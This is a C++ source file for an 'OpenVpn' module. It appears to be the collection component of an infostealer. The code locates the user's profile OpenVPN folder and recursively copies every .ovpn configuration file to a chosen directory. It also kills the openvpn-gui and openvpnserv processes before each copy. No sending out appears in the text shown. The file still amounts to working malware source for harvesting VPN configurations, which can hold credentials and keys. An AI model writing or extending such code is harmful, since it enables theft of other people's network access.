#include "OpenVpn.h"
#include "Filemanager.h"
#include <Windows.h>
#include <wincrypt.h>
#include <fstream>
#include <shlwapi.h>
#include <dpapi.h>
#include <iostream>
#include <shlobj.h>
#include <tchar.h>
#include <chrono>
#include <ctime>
#include <iomanip>
#include <sstream>


// Define a macro to suppress warnings related to deprecated filesystem features in experimental mode
#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING

// Include the experimental filesystem library
#include <experimental/filesystem>

// Create an alias for the namespace to simplify code (use experimental filesystem)
namespace fs = std::experimental::filesystem;

// Link to the "Shlwapi.lib" library which contains functions like SHGetFolderPathA
#pragma comment(lib, "Shlwapi.lib")

// Use the standard namespace to avoid prefixing std:: in the code
using namespace std;

// Function to get the current local time formatted as a string (e.g., 20241117123000)
std::string GetCurrentLocalTime()
{
    // Get the current system time as a time_point
    auto now = std::chrono::system_clock::now();

    // Convert the time_point to a time_t type for compatibility with C-style time functions
    std::time_t time = std::chrono::system_clock::to_time_t(now);

    // Declare a tm structure to hold the local time breakdown
    std::tm localTime;

    // Platform-specific handling for localtime to ensure thread-safety
#ifdef _WIN32
    // For Windows, use localtime_s which is thread-safe
    localtime_s(&localTime, &time);
#else
    // For other platforms, use localtime_r which is thread-safe
    localtime_r(&time, &localTime);
#endif  

    // Create a stringstream to format the time into a specific string format
    std::stringstream ss;

    // Format the time into the "YYYYMMDDHHMMSS" format
    ss << std::put_time(&localTime, "%Y%m%d%H%M%S");

    // Return the formatted time string
    return ss.str();
}

// Function to recursively copy .ovpn files from the source directory to the destination directory
void OpenVpn::copyOVPNFiles(const std::string& sourceDir, const std::string& destinationDir) {

    // Define a structure to hold information about the found files
    WIN32_FIND_DATAA findData;

    // Define a handle for file search
    HANDLE hFind;

    // Create a search pattern to match all files in the source directory
    std::string searchPattern = sourceDir + "\\*";

    // Start searching for files in the source directory
    hFind = FindFirstFileA(searchPattern.c_str(), &findData);

    // Check if the directory was successfully opened
    if (hFind == INVALID_HANDLE_VALUE) {
        // Print an error message if the directory could not be accessed
        std::cerr << "Failed to find first file in directory: " << sourceDir << std::endl;
        return;
    }

    // Loop through all files and directories in the source directory
    do {
        // If the item is a directory, we handle it recursively
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip the "." and ".." directories
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
                continue;

            // Build the path for the subdirectory
            std::string subDir = sourceDir + "\\" + findData.cFileName;

            // Recursively call copyOVPNFiles to process the subdirectory
            copyOVPNFiles(subDir, destinationDir);
        }
        else {
            // If the item is a file, check if it is a .ovpn file
            std::string fileName = findData.cFileName;
            size_t extPos = fileName.rfind(".");

            // If the file extension is .ovpn, we proceed to copy it
            if (extPos != std::string::npos && fileName.substr(extPos) == ".ovpn") {
                // Construct the full source and destination paths
                std::string sourcePath = sourceDir + "\\" + fileName;
                std::string destinationPath = destinationDir + "\\" + fileName;

                // Kill any existing OpenVPN processes before copying the file
                Filemanager::killprocess("openvpn-gui.exe");
                Filemanager::killprocess("openvpnserv.exe");
                Filemanager::killprocess("openvpnserv2.exe");

                // Copy the .ovpn file from the source to the destination directory
                bool nRet = CopyFileA(sourcePath.c_str(), destinationPath.c_str(), FALSE);
            }
        }
        // Continue the search for the next file or directory
    } while (FindNextFileA(hFind, &findData));

    // Close the file search handle after the operation is complete
    FindClose(hFind);
}

// Function to save the OpenVPN files by copying them to the destination directory
void OpenVpn::Save(const std::string destinationDir)
{
    // Create the destination directory if it doesn't already exist
    if (!fs::create_directories(destinationDir))
    {
        return;  // Return early if the directory could not be created
    }

    // Define a buffer to store the path of the user's profile folder
    char szFolderPath[MAX_PATH];

    // Retrieve the profile folder path (CSIDL_PROFILE) using the Shell API
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, szFolderPath);

    // Append "\\OpenVPN" to the profile folder path
    strcat_s(szFolderPath, sizeof(szFolderPath), "\\OpenVPN");

    // Call the copyOVPNFiles function to copy files from the profile folder to the destination directory
    copyOVPNFiles(szFolderPath, destinationDir);
}
